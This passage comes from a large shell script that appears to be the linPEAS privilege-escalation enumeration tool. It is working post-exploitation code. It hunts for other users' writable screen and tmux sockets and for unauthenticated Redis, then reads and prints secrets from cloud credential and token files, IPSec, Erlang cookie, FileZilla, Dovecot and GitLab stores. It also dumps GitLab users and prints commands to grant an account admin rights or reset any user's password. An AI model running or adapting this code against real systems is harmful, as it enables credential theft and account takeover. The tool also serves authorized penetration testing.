  3915	if ([ "$screensess" ] || [ "$screensess2" ] || [ "$DEBUG" ]) && ! [ "$SEARCH_IN_FOLDER" ]; then
  3916	  print_2title "Searching screen sessions"
  3917	  print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-shell-sessions"
  3918	  screensess=$(screen -ls 2>/dev/null)
  3919	  screensess2=$(find /run/screen -type d -path "/run/screen/S-*" 2>/dev/null)
  3920	  
  3921	  screen -v
  3922	  printf "$screensess\n$screensess2" | sed -${E} "s,.*,${SED_RED}," | sed -${E} "s,No Sockets found.*,${C}[32m&${C}[0m,"
  3923	  
  3924	  find /run/screen -type s -path "/run/screen/S-*" -not -user $USER '(' '(' -perm -o=w ')' -or  '(' -perm -g=w -and '(' $wgroups ')' ')' ')' 2>/dev/null | while read f; do
  3925	    echo "Other user screen socket is writable: $f" | sed "s,$f,${SED_RED_YELLOW},"
  3926	  done
  3927	  echo ""
  3928	fi
  3929	
  3930	#-- SI) Tmux sessions
  3931	tmuxdefsess=$(tmux ls 2>/dev/null)
  3932	tmuxnondefsess=$(ps auxwww | grep "tmux " | grep -v grep)
  3933	tmuxsess2=$(find /tmp -type d -path "/tmp/tmux-*" 2>/dev/null)
  3934	if ([ "$tmuxdefsess" ] || [ "$tmuxnondefsess" ] || [ "$tmuxsess2" ] || [ "$DEBUG" ]) && ! [ "$SEARCH_IN_FOLDER" ]; then
  3935	  print_2title "Searching tmux sessions"$N
  3936	  print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-shell-sessions"
  3937	  tmux -V
  3938	  printf "$tmuxdefsess\n$tmuxnondefsess\n$tmuxsess2" | sed -${E} "s,.*,${SED_RED}," | sed -${E} "s,no server running on.*,${C}[32m&${C}[0m,"
  3939	
  3940	  find /tmp -type s -path "/tmp/tmux*" -not -user $USER '(' '(' -perm -o=w ')' -or  '(' -perm -g=w -and '(' $wgroups ')' ')' ')' 2>/dev/null | while read f; do
  3941	    echo "Other user tmux socket is writable: $f" | sed "s,$f,${SED_RED_YELLOW},"
  3942	  done
  3943	  echo ""
  3944	fi
  3945	
  3946	if [ "$PSTORAGE_COUCHDB" ] || [ "$DEBUG" ]; then
  3947	  print_2title "Analyzing CouchDB Files (limit 70)"
  3948	    if ! [ "`echo \"$PSTORAGE_COUCHDB\" | grep -E \"couchdb$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "couchdb"; fi; fi; printf "%s" "$PSTORAGE_COUCHDB" | grep -E "couchdb$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,couchdb$,${SED_RED},"; find "$f" -name "local.ini" | while read ff; do ls -ld "$ff" | sed -${E} "s,local.ini,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | grep -Ev "^;" | sed -${E} "s,admin.*|password.*|cert_file.*|key_file.*|hashed.*|pbkdf2.*,${SED_RED},g"; done; echo "";done; echo "";
  3949	fi
  3950	
  3951	
  3952	if [ "$PSTORAGE_REDIS" ] || [ "$DEBUG" ]; then
  3953	  print_2title "Analyzing Redis Files (limit 70)"
  3954	    ( redis-server --version || echo_not_found "redis-server") 2>/dev/null
  3955	    if [ "`redis-cli INFO 2>/dev/null`" ] && ! [ "`redis-cli INFO 2>/dev/null | grep -i NOAUTH`" ]; then echo "Redis isn't password protected" | sed -${E} "s,.*,${SED_RED},"; fi
  3956	    if ! [ "`echo \"$PSTORAGE_REDIS\" | grep -E \"redis\.conf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "redis.conf"; fi; fi; printf "%s" "$PSTORAGE_REDIS" | grep -E "redis\.conf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,redis\.conf$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -Ev "\W+\#|^#" | sed -${E} "s,masterauth.*|requirepass.*,${SED_RED},g"; done; echo "";
  3957	fi
  3958	
  3959	
  3960	#-- SI) Dovecot
  3961	# Needs testing
  3962	dovecotpass=$(grep -r "PLAIN" /etc/dovecot 2>/dev/null)
  3963	if [ "$dovecotpass" ] || [ "$DEBUG" ]; then
  3964	  print_2title "Searching dovecot files"
  3965	  if [ -z "$dovecotpass" ]; then
  3966	    echo_not_found "dovecot credentials"
  3967	  else
  3968	    printf "%s\n" "$dovecotpass" | while read d; do
  3969	      df=$(echo $d |cut -d ':' -f1)
  3970	      dp=$(echo $d |cut -d ':' -f2-)
  3971	      echo "Found possible PLAIN text creds in $df"
  3972	      echo "$dp" | sed -${E} "s,.*,${SED_RED}," 2>/dev/null
  3973	    done
  3974	  fi
  3975	  echo ""
  3976	fi
  3977	
  3978	if [ "$PSTORAGE_MOSQUITTO" ] || [ "$DEBUG" ]; then
  3979	  print_2title "Analyzing Mosquitto Files (limit 70)"
  3980	    if ! [ "`echo \"$PSTORAGE_MOSQUITTO\" | grep -E \"mosquitto\.conf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "mosquitto.conf"; fi; fi; printf "%s" "$PSTORAGE_MOSQUITTO" | grep -E "mosquitto\.conf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,mosquitto\.conf$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -Ev "\W+\#|^#" | sed -${E} "s,password_file.*|psk_file.*|allow_anonymous.*true|auth,${SED_RED},g"; done; echo "";
  3981	fi
  3982	
  3983	
  3984	if [ "$PSTORAGE_NEO4J" ] || [ "$DEBUG" ]; then
  3985	  print_2title "Analyzing Neo4j Files (limit 70)"
  3986	    if ! [ "`echo \"$PSTORAGE_NEO4J\" | grep -E \"neo4j$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "neo4j"; fi; fi; printf "%s" "$PSTORAGE_NEO4J" | grep -E "neo4j$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,neo4j$,${SED_RED},"; find "$f" -name "auth" | while read ff; do ls -ld "$ff" | sed -${E} "s,auth,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,.*,${SED_RED},g"; done; echo "";done; echo "";
  3987	fi
  3988	
  3989	
  3990	AWSVAULT="$(command -v aws-vault 2>/dev/null)"
  3991	if [ "$AWSVAULT" ] || [ "$DEBUG" ]; then
  3992	  print_2title "Check aws-vault"
  3993	  aws-vault list
  3994	fi
  3995	
  3996	if [ "$PSTORAGE_CLOUD_CREDENTIALS" ] || [ "$DEBUG" ]; then
  3997	  print_2title "Analyzing Cloud Credentials Files (limit 70)"
  3998	    if ! [ "`echo \"$PSTORAGE_CLOUD_CREDENTIALS\" | grep -E \"credentials\.db$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "credentials.db"; fi; fi; printf "%s" "$PSTORAGE_CLOUD_CREDENTIALS" | grep -E "credentials\.db$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,credentials\.db$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,.*,${SED_RED},g"; done; echo "";
  3999	    if ! [ "`echo \"$PSTORAGE_CLOUD_CREDENTIALS\" | grep -E \"legacy_credentials\.db$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "legacy_credentials.db"; fi; fi; printf "%s" "$PSTORAGE_CLOUD_CREDENTIALS" | grep -E "legacy_credentials\.db$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,legacy_credentials\.db$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,.*,${SED_RED},g"; done; echo "";
  4000	    if ! [ "`echo \"$PSTORAGE_CLOUD_CREDENTIALS\" | grep -E \"adc\.json$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "adc.json"; fi; fi; printf "%s" "$PSTORAGE_CLOUD_CREDENTIALS" | grep -E "adc\.json$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,adc\.json$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,.*,${SED_RED},g"; done; echo "";
  4001	    if ! [ "`echo \"$PSTORAGE_CLOUD_CREDENTIALS\" | grep -E \"\.boto$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".boto"; fi; fi; printf "%s" "$PSTORAGE_CLOUD_CREDENTIALS" | grep -E "\.boto$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.boto$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,.*,${SED_RED},g"; done; echo "";
  4002	    if ! [ "`echo \"$PSTORAGE_CLOUD_CREDENTIALS\" | grep -E \"\.credentials\.json$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".credentials.json"; fi; fi; printf "%s" "$PSTORAGE_CLOUD_CREDENTIALS" | grep -E "\.credentials\.json$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.credentials\.json$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,.*,${SED_RED},g"; done; echo "";
  4003	    if ! [ "`echo \"$PSTORAGE_CLOUD_CREDENTIALS\" | grep -E \"firebase-tools\.json$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "firebase-tools.json"; fi; fi; printf "%s" "$PSTORAGE_CLOUD_CREDENTIALS" | grep -E "firebase-tools\.json$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,firebase-tools\.json$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,id_token.*|access_token.*|refresh_token.*,${SED_RED},g"; done; echo "";
  4004	    if ! [ "`echo \"$PSTORAGE_CLOUD_CREDENTIALS\" | grep -E \"access_tokens\.db$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "access_tokens.db"; fi; fi; printf "%s" "$PSTORAGE_CLOUD_CREDENTIALS" | grep -E "access_tokens\.db$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,access_tokens\.db$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,.*,${SED_RED},g"; done; echo "";
  4005	    if ! [ "`echo \"$PSTORAGE_CLOUD_CREDENTIALS\" | grep -E \"access_tokens\.json$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "access_tokens.json"; fi; fi; printf "%s" "$PSTORAGE_CLOUD_CREDENTIALS" | grep -E "access_tokens\.json$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,access_tokens\.json$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,.*,${SED_RED},g"; done; echo "";
  4006	    if ! [ "`echo \"$PSTORAGE_CLOUD_CREDENTIALS\" | grep -E \"accessTokens\.json$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "accessTokens.json"; fi; fi; printf "%s" "$PSTORAGE_CLOUD_CREDENTIALS" | grep -E "accessTokens\.json$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,accessTokens\.json$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,.*,${SED_RED},g"; done; echo "";
  4007	    if ! [ "`echo \"$PSTORAGE_CLOUD_CREDENTIALS\" | grep -E \"gcloud$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "gcloud"; fi; fi; printf "%s" "$PSTORAGE_CLOUD_CREDENTIALS" | grep -E "gcloud$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,gcloud$,${SED_RED},"; find "$f" -name "*" | while read ff; do ls -ld "$ff" | sed -${E} "s,.*,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | grep -E "b'authorization'.*" | sed -${E} "s,b'authorization'.*,${SED_RED},g"; done; echo "";done; echo "";
  4008	    if ! [ "`echo \"$PSTORAGE_CLOUD_CREDENTIALS\" | grep -E \"legacy_credentials$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "legacy_credentials"; fi; fi; printf "%s" "$PSTORAGE_CLOUD_CREDENTIALS" | grep -E "legacy_credentials$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,legacy_credentials$,${SED_RED},"; find "$f" -name "*" | while read ff; do ls -ld "$ff" | sed -${E} "s,.*,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,refresh_token.*|client_secret,${SED_RED},g"; done; echo "";done; echo "";
  4009	    if ! [ "`echo \"$PSTORAGE_CLOUD_CREDENTIALS\" | grep -E \"azureProfile\.json$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "azureProfile.json"; fi; fi; printf "%s" "$PSTORAGE_CLOUD_CREDENTIALS" | grep -E "azureProfile\.json$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,azureProfile\.json$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,.*,${SED_RED},g"; done; echo "";
  4010	    if ! [ "`echo \"$PSTORAGE_CLOUD_CREDENTIALS\" | grep -E \"TokenCache\.dat$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "TokenCache.dat"; fi; fi; printf "%s" "$PSTORAGE_CLOUD_CREDENTIALS" | grep -E "TokenCache\.dat$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,TokenCache\.dat$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,.*,${SED_RED},g"; done; echo "";
  4011	    if ! [ "`echo \"$PSTORAGE_CLOUD_CREDENTIALS\" | grep -E \"AzureRMContext\.json$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "AzureRMContext.json"; fi; fi; printf "%s" "$PSTORAGE_CLOUD_CREDENTIALS" | grep -E "AzureRMContext\.json$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,AzureRMContext\.json$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,.*,${SED_RED},g"; done; echo "";
  4012	    if ! [ "`echo \"$PSTORAGE_CLOUD_CREDENTIALS\" | grep -E \"ErrorRecords$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "ErrorRecords"; fi; fi; printf "%s" "$PSTORAGE_CLOUD_CREDENTIALS" | grep -E "ErrorRecords$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,ErrorRecords$,${SED_RED},"; done; echo "";
  4013	    if ! [ "`echo \"$PSTORAGE_CLOUD_CREDENTIALS\" | grep -E \"TokenCache\.dat$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "TokenCache.dat"; fi; fi; printf "%s" "$PSTORAGE_CLOUD_CREDENTIALS" | grep -E "TokenCache\.dat$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,TokenCache\.dat$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,.*,${SED_RED},g"; done; echo "";
  4014	    if ! [ "`echo \"$PSTORAGE_CLOUD_CREDENTIALS\" | grep -E \"\.bluemix$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".bluemix"; fi; fi; printf "%s" "$PSTORAGE_CLOUD_CREDENTIALS" | grep -E "\.bluemix$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.bluemix$,${SED_RED},"; find "$f" -name "config.json" | while read ff; do ls -ld "$ff" | sed -${E} "s,config.json,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,.*,${SED_RED},g"; done; echo "";done; echo "";
  4015	    if ! [ "`echo \"$PSTORAGE_CLOUD_CREDENTIALS\" | grep -E \"doctl$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "doctl"; fi; fi; printf "%s" "$PSTORAGE_CLOUD_CREDENTIALS" | grep -E "doctl$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,doctl$,${SED_RED},"; find "$f" -name "config.yaml" | while read ff; do ls -ld "$ff" | sed -${E} "s,config.yaml,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | grep -E "access-token.*" | sed -${E} "s,access-token.*,${SED_RED},g"; done; echo "";done; echo "";
  4016	fi
  4017	
  4018	
  4019	if [ "$PSTORAGE_CLOUD_INIT" ] || [ "$DEBUG" ]; then
  4020	  print_2title "Analyzing Cloud Init Files (limit 70)"
  4021	    if ! [ "`echo \"$PSTORAGE_CLOUD_INIT\" | grep -E \"cloud\.cfg$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "cloud.cfg"; fi; fi; printf "%s" "$PSTORAGE_CLOUD_INIT" | grep -E "cloud\.cfg$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,cloud\.cfg$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -E "consumer_key|token_key|token_secret|metadata_url|password:|passwd:|PRIVATE KEY|PRIVATE KEY|encrypted_data_bag_secret|_proxy" | grep -Ev "\W+\#|^#" | sed -${E} "s,consumer_key|token_key|token_secret|metadata_url|password:|passwd:|PRIVATE KEY|PRIVATE KEY|encrypted_data_bag_secret|_proxy,${SED_RED},g"; done; echo "";
  4022	fi
  4023	
  4024	
  4025	if [ "$PSTORAGE_CLOUDFLARE" ] || [ "$DEBUG" ]; then
  4026	  print_2title "Analyzing CloudFlare Files (limit 70)"
  4027	    if ! [ "`echo \"$PSTORAGE_CLOUDFLARE\" | grep -E \"\.cloudflared$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".cloudflared"; fi; fi; printf "%s" "$PSTORAGE_CLOUDFLARE" | grep -E "\.cloudflared$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.cloudflared$,${SED_RED},"; ls -lRA "$f";done; echo "";
  4028	fi
  4029	
  4030	
  4031	if [ "$PSTORAGE_ERLANG" ] || [ "$DEBUG" ]; then
  4032	  print_2title "Analyzing Erlang Files (limit 70)"
  4033	    if ! [ "`echo \"$PSTORAGE_ERLANG\" | grep -E \"\.erlang\.cookie$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".erlang.cookie"; fi; fi; printf "%s" "$PSTORAGE_ERLANG" | grep -E "\.erlang\.cookie$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.erlang\.cookie$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,.*,${SED_RED},g"; done; echo "";
  4034	fi
  4035	
  4036	
  4037	if [ "$PSTORAGE_GMV_AUTH" ] || [ "$DEBUG" ]; then
  4038	  print_2title "Analyzing GMV Auth Files (limit 70)"
  4039	    if ! [ "`echo \"$PSTORAGE_GMV_AUTH\" | grep -E \"gvm-tools\.conf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "gvm-tools.conf"; fi; fi; printf "%s" "$PSTORAGE_GMV_AUTH" | grep -E "gvm-tools\.conf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,gvm-tools\.conf$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,username.*|password.*,${SED_RED},g"; done; echo "";
  4040	fi
  4041	
  4042	
  4043	if [ "$PSTORAGE_IPSEC" ] || [ "$DEBUG" ]; then
  4044	  print_2title "Analyzing IPSec Files (limit 70)"
  4045	    if ! [ "`echo \"$PSTORAGE_IPSEC\" | grep -E \"ipsec\.secrets$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "ipsec.secrets"; fi; fi; printf "%s" "$PSTORAGE_IPSEC" | grep -E "ipsec\.secrets$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,ipsec\.secrets$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,.*PSK.*|.*RSA.*|.*EAP =.*|.*XAUTH.*,${SED_RED},g"; done; echo "";
  4046	    if ! [ "`echo \"$PSTORAGE_IPSEC\" | grep -E \"ipsec\.conf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "ipsec.conf"; fi; fi; printf "%s" "$PSTORAGE_IPSEC" | grep -E "ipsec\.conf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,ipsec\.conf$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,.*PSK.*|.*RSA.*|.*EAP =.*|.*XAUTH.*,${SED_RED},g"; done; echo "";
  4047	fi
  4048	
  4049	
  4050	if [ "$PSTORAGE_IRSSI" ] || [ "$DEBUG" ]; then
  4051	  print_2title "Analyzing IRSSI Files (limit 70)"
  4052	    if ! [ "`echo \"$PSTORAGE_IRSSI\" | grep -E \"\.irssi$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".irssi"; fi; fi; printf "%s" "$PSTORAGE_IRSSI" | grep -E "\.irssi$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.irssi$,${SED_RED},"; find "$f" -name "config" | while read ff; do ls -ld "$ff" | sed -${E} "s,config,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,password.*,${SED_RED},g"; done; echo "";done; echo "";
  4053	fi
  4054	
  4055	
  4056	if [ "$PSTORAGE_KEYRING" ] || [ "$DEBUG" ]; then
  4057	  print_2title "Analyzing Keyring Files (limit 70)"
  4058	    if ! [ "`echo \"$PSTORAGE_KEYRING\" | grep -E \"keyrings$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "keyrings"; fi; fi; printf "%s" "$PSTORAGE_KEYRING" | grep -E "keyrings$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,keyrings$,${SED_RED},"; done; echo "";
  4059	    if ! [ "`echo \"$PSTORAGE_KEYRING\" | grep -E \"\.keyring$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "*.keyring"; fi; fi; printf "%s" "$PSTORAGE_KEYRING" | grep -E "\.keyring$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.keyring$,${SED_RED},"; done; echo "";
  4060	    if ! [ "`echo \"$PSTORAGE_KEYRING\" | grep -E \"\.keystore$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "*.keystore"; fi; fi; printf "%s" "$PSTORAGE_KEYRING" | grep -E "\.keystore$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.keystore$,${SED_RED},"; done; echo "";
  4061	    if ! [ "`echo \"$PSTORAGE_KEYRING\" | grep -E \"\.jks$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "*.jks"; fi; fi; printf "%s" "$PSTORAGE_KEYRING" | grep -E "\.jks$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.jks$,${SED_RED},"; done; echo "";
  4062	fi
  4063	
  4064	
  4065	if [ "$PSTORAGE_FILEZILLA" ] || [ "$DEBUG" ]; then
  4066	  print_2title "Analyzing Filezilla Files (limit 70)"
  4067	    if ! [ "`echo \"$PSTORAGE_FILEZILLA\" | grep -E \"filezilla$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "filezilla"; fi; fi; printf "%s" "$PSTORAGE_FILEZILLA" | grep -E "filezilla$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,filezilla$,${SED_RED},"; find "$f" -name "sitemanager.xml" | while read ff; do ls -ld "$ff" | sed -${E} "s,sitemanager.xml,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | grep -Ev "^;" | sed -${E} "s,Host.*|Port.*|Protocol.*|User.*|Pass.*,${SED_RED},g"; done; echo "";done; echo "";
  4068	    if ! [ "`echo \"$PSTORAGE_FILEZILLA\" | grep -E \"filezilla\.xml$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "filezilla.xml"; fi; fi; printf "%s" "$PSTORAGE_FILEZILLA" | grep -E "filezilla\.xml$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,filezilla\.xml$,${SED_RED},"; done; echo "";
  4069	    if ! [ "`echo \"$PSTORAGE_FILEZILLA\" | grep -E \"recentservers\.xml$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "recentservers.xml"; fi; fi; printf "%s" "$PSTORAGE_FILEZILLA" | grep -E "recentservers\.xml$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,recentservers\.xml$,${SED_RED},"; done; echo "";
  4070	fi
  4071	
  4072	
  4073	if [ "$PSTORAGE_BACKUP_MANAGER" ] || [ "$DEBUG" ]; then
  4074	  print_2title "Analyzing Backup Manager Files (limit 70)"
  4075	    if ! [ "`echo \"$PSTORAGE_BACKUP_MANAGER\" | grep -E \"storage\.php$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "storage.php"; fi; fi; printf "%s" "$PSTORAGE_BACKUP_MANAGER" | grep -E "storage\.php$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,storage\.php$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -E "'pass'|'password'|'user'|'database'|'host'" | sed -${E} "s,password|pass|user|database|host,${SED_RED},g"; done; echo "";
  4076	    if ! [ "`echo \"$PSTORAGE_BACKUP_MANAGER\" | grep -E \"database\.php$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "database.php"; fi; fi; printf "%s" "$PSTORAGE_BACKUP_MANAGER" | grep -E "database\.php$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,database\.php$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -E "'pass'|'password'|'user'|'database'|'host'" | sed -${E} "s,password|pass|user|database|host,${SED_RED},g"; done; echo "";
  4077	fi
  4078	
  4079	
  4080	##-- SI) passwd files (splunk)
  4081	SPLUNK_BIN="$(command -v splunk 2>/dev/null)"
  4082	if [ "$PSTORAGE_SPLUNK" ] || [ "$SPLUNK_BIN" ] || [ "$DEBUG" ]; then
  4083	  print_2title "Searching uncommon passwd files (splunk)"
  4084	  if [ "$SPLUNK_BIN" ]; then echo "splunk binary was found installed on $SPLUNK_BIN" | sed "s,.*,${SED_RED},"; fi
  4085	  printf "%s\n" "$PSTORAGE_SPLUNK" | grep -v ".htpasswd" | sort | uniq | while read f; do
  4086	    if [ -f "$f" ] && ! [ -x "$f" ]; then
  4087	      echo "passwd file: $f" | sed "s,$f,${SED_RED},"
  4088	      cat "$f" 2>/dev/null | grep "'pass'|'password'|'user'|'database'|'host'|\$" | sed -${E} "s,password|pass|user|database|host|\$,${SED_RED},"
  4089	    fi
  4090	  done
  4091	  echo ""
  4092	fi
  4093	
  4094	if [ "$PSTORAGE_KCPASSWORD" ] || [ "$DEBUG" ]; then
  4095	  print_2title "Analyzing kcpassword files"
  4096	  print_info "https://book.hacktricks.xyz/macos/macos-security-and-privilege-escalation#kcpassword"
  4097	  printf "%s\n" "$PSTORAGE_KCPASSWORD" | while read f; do
  4098	    echo "$f" | sed -${E} "s,.*,${SED_RED},"
  4099	    base64 "$f" 2>/dev/null | sed -${E} "s,.*,${SED_RED},"
  4100	  done
  4101	  echo ""
  4102	fi
  4103	
  4104	##-- SI) Gitlab
  4105	if [ "$(command -v gitlab-rails)" ] || [ "$(command -v gitlab-backup)" ] || [ "$PSTORAGE_GITLAB" ] || [ "$DEBUG" ]; then
  4106	  print_2title "Searching GitLab related files"
  4107	  #Check gitlab-rails
  4108	  if [ "$(command -v gitlab-rails)" ]; then
  4109	    echo "gitlab-rails was found. Trying to dump users..."
  4110	    gitlab-rails runner 'User.where.not(username: "peasssssssss").each { |u| pp u.attributes }' | sed -${E} "s,email|password,${SED_RED},"
  4111	    echo "If you have enough privileges, you can make an account under your control administrator by running: gitlab-rails runner 'user = User.find_by(email: \"youruser@example.com\"); user.admin = TRUE; user.save!'"
  4112	    echo "Alternatively, you could change the password of any user by running: gitlab-rails runner 'user = User.find_by(email: \"admin@example.com\"); user.password = \"pass_peass_pass\"; user.password_confirmation = \"pass_peass_pass\"; user.save!'"
  4113	    echo ""
  4114	  fi
  4115	  if [ "$(command -v gitlab-backup)" ]; then
  4116	    echo "If you have enough privileges, you can create a backup of all the repositories inside gitlab using 'gitlab-backup create'"
  4117	    echo "Then you can get the plain-text with something like 'git clone \@hashed/19/23/14348274[...]38749234.bundle'"
  4118	    echo ""
  4119	  fi
  4120	  #Check gitlab files
  4121	  printf "%s\n" "$PSTORAGE_GITLAB" | sort | uniq | while read f; do
  4122	    if echo $f | grep -q secrets.yml; then
  4123	      echo "Found $f" | sed "s,$f,${SED_RED},"
  4124	      cat "$f" 2>/dev/null | grep -Iv "^$" | grep -v "^#"
  4125	    elif echo $f | grep -q gitlab.yml; then
  4126	      echo "Found $f" | sed "s,$f,${SED_RED},"
  4127	      cat "$f" | grep -A 4 "repositories:"
  4128	    elif echo $f | grep -q gitlab.rb; then
  4129	      echo "Found $f" | sed "s,$f,${SED_RED},"
  4130	      cat "$f" | grep -Iv "^$" | grep -v "^#" | sed -${E} "s,email|user|password,${SED_RED},"
  4131	    fi
  4132	    echo ""
  4133	  done
  4134	  echo ""
  4135	fi
  4136	
  4137	if [ "$PSTORAGE_GITHUB" ] || [ "$DEBUG" ]; then
  4138	  print_2title "Analyzing Github Files (limit 70)"
  4139	    if ! [ "`echo \"$PSTORAGE_GITHUB\" | grep -E \"\.github$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".github"; fi; fi; printf "%s" "$PSTORAGE_GITHUB" | grep -E "\.github$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.github$,${SED_RED},"; done; echo "";
  4140	    if ! [ "`echo \"$PSTORAGE_GITHUB\" | grep -E \"\.gitconfig$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".gitconfig"; fi; fi; printf "%s" "$PSTORAGE_GITHUB" | grep -E "\.gitconfig$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.gitconfig$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$"; done; echo "";
